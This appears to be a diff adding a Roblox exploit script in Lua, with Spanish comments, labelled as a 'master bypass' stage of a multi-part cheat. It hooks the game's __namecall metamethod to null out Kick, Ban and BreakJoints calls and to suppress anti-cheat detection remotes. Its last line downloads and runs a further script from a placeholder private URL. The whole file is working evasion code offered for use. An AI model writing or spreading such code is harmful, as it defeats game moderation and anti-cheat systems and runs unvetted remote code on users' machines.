@@ -1,0 +1,25 @@
+-- ANILLO 2: BYPASS MAESTRO (PC & MOBILE)
+local MT = getrawmetatable(game)
+local OldNC = MT.__namecall
+setreadonly(MT, false)
+
+MT.__namecall = newcclosure(function(self, ...)
+    local Method = getnamecallmethod()
+    local Args = {...}
+
+    -- Si el sistema mediocre intenta mandarte un KICK, lo nulificamos
+    if Method == "Kick" or Method == "Ban" or Method == "BreakJoints" then
+        warn("Z-SQUAD: Intento de sancion bloqueado.")
+        return nil 
+    end
+
+    -- Bypass de detección de BodyVelocity y Fly
+    if Method == "FireServer" and (self.Name:find("Check") or self.Name:find("Detection")) then
+        return nil
+    end
+
+    return OldNC(self, unpack(Args))
+end)
+
+task.wait(3) -- Delay para asegurar que el Metatable esté enganchado
+loadstring(game:HttpGet("https://tu-link-privado.com/anillo3.lua"))()
